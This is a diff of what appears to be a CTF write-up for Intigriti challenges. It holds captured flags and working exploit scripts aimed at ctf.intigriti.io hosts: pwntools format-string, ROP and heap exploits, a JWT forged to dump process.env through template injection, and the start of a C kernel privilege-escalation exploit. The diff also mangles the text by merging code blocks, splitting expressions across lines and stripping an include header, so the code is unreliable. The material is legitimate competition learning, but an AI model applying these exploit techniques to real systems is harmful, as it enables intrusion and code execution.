@@ -106,41 +106,11 @@ Twitter：@wgpsec
 
 ```
 INTIGRITI{1f_y0u_l34v3_7h3_fl46_w1ll_b3_r3v0k3d}
-```
-
-
-
-```
 h0p3_y0u
-```
-
-
-
-```
 _3nj0y_
-```
-
-
-
-```
 d4_c7f
-```
-
-
-
-```
 INTIGRITI{h0p3_y0u_3nj0y_d4_c7f}
-```
-
-
-
-```
 INTIGRITI{b451c_x0r_wh47?}
-```
-
-
-
-```
 const crypto = require('crypto');
 const jwt = require("json-web-token");
 
@@ -165,21 +135,15 @@ let result = jwt.encode(abc, {
 console.log(result);
 
 // JSON.stringify(process.env) eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7SlNPTi5zdHJpbmdpZnkocHJvY2Vzcy5lbnYpfSJ9.h_9iOoB-dvIGW7R3zTVBr0FffiHxWe1tmP_-E7RJsOo
-```
-
-
-
-```
-SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123
-```
-
-
-
-```
+SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUr
+EPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd1
+23SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEc
+UrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoRd123SuPeRsEcUrEPaSsWoR
+d123SuPeRsEcUrEPaSsWoRd123
 from pwn import *
 
 context.terminal = ["tmux", "splitw", "-h"]
-#io=process("./chal")
+    #io=process("./chal")
 io=remote("riggedslot2.ctf.intigriti.io", 1337)
 
 rv = lambda a : io.recv(a)
@@ -199,16 +163,11 @@ p=name+p32(1337420+1)
 sla(":",p)
 sla(":","1")
 print ru("}")
-```
-
-
-
-```
 from pwn import *
 
 context(arch='amd64',os='linux')
 context.terminal = ["tmux", "splitw", "-h"]
-#io=process("./chal")
+    #io=process("./chal")
 io=remote("floormatsale.ctf.intigriti.io", 1339)
 
 rv = lambda a : io.recv(a)
@@ -222,22 +181,18 @@ shell = lambda            : io.interactive()
 def debug():
     gdb.attach(io)
 
-p=fmtstr_payload(10,{0x040408C:0x1})
+p=fmtstr_payload(10,{0x040408C:
+0x1})
 print len(p)
 sla(":","6")
 sla(":",p)
 print ru("}")
 shell()
-```
-
-
-
-```
 from pwn import *
 
-#context(arch='amd64',os='linux',log_level='debug')
+    #context(arch='amd64',os='linux',log_level='debug')
 context.terminal = ["tmux", "splitw", "-h"]
-#io=process("./drone")
+    #io=process("./drone")
 io=remote("uap.ctf.intigriti.io", 1340)
 
 rv = lambda a : io.recv(a)
@@ -260,15 +215,10 @@ sl(p64(0x1)+p64(win)*3)
 sl("3")
 sl("1")
 print ru("}")
-```
-
-
-
-```
 from pwn import *
 
 context.terminal = ["tmux", "splitw", "-h"]
-#io=process("./notepad")
+    #io=process("./notepad")
 io=remote("notepad.ctf.intigriti.io", 1341)
 
 rv = lambda a : io.recv(a)
@@ -317,16 +267,11 @@ create(3,128,"D"*8)
 create(4,128,p64(0xCAFEBABE))
 secret()
 shell()
-```
-
-
-
-```
 from pwn import *
 
 context(arch='amd64',os='linux',log_level='debug')
 context.terminal = ["tmux", "splitw", "-h"]
-#io=process("./retro2win")
+    #io=process("./retro2win")
 io=remote("retro2win.ctf.intigriti.io", 1338)
 
 rv = lambda a : io.recv(a)
@@ -340,18 +285,13 @@ shell = lambda            : io.interactive()
 def debug():
     gdb.attach(io)
 
-#io=process("./retro2win")
+    #io=process("./retro2win")
 io=remote("retro2win.ctf.intigriti.io", 1338)
 win=0x0400736
 sla(":","1337")
 sla(":","A"*24+p64(0x0400589)+p64(0x00000000004009b3)+p64(0x2323232323232323)+p64(0x00000000004009b1)+p64(0x4242424242424242)+p64(0)+p64(win))
 print ru("}")
 shell()
-```
-
-
-
-```
 from pwn import *
 
 s       = lambda data               :io.send(data)
@@ -361,7 +301,8 @@ sla     = lambda tag,data           :io.sendlineafter(tag, da
 r       = lambda num=4096           :io.recv(num)
 ru      = lambda tag, drop=True     :io.recvuntil(tag, drop)
 rl      = lambda                    :io.recvline()
-l64     = lambda      :u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))
+l64     = lambda      :
+u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))
 
 io = process("./pwn")
 elf = ELF("./pwn")
@@ -416,15 +357,10 @@ def exp():
 
 exp()
 io.interactive()
-```
-
-
-
-```
 // musl-gcc exp.c -o exp -masm=intel -static
-#include <stdio.h>
-#include <unistd.h>
-#include <stdlib.h>
+    #include <stdio.h>
+    #include 
+    #include <stdlib.h>
 
 size_t user_cs, user_ss, user_rflags, user_sp;
 
@@ -486,17 +422,7 @@ int main(){
 
  write(fd, buf, 0x280);
 }
-```
-
-
-
-```
 Hey, check this QR code ASAP! It's highly sensitive so I scrambled it, but you shouldn't have a hard time reconstructing - just make sure to update the a_order to our shared PIN. The b_order is the reverse of that 😉
-```
-
-
-
-```
 from PIL import Image, ImageDraw
 from itertools import permutations
 
@@ -555,17 +481,7 @@ for a_order in all_permutations:
         output_filename = f"reconstructed_{''.join(a_order)}_{''.join(b_order)}.png"
         reconstructed_image.save(output_filename)
         print(f"Saved {output_filename}")
-```
-
-
-
-```
 INTIGRITI{5q1_log_analys1s_f0r_7h3_w1n!}
-```
-
-
-
-```
 from pwn import remote,p64,context
 local=0
 if local==1:
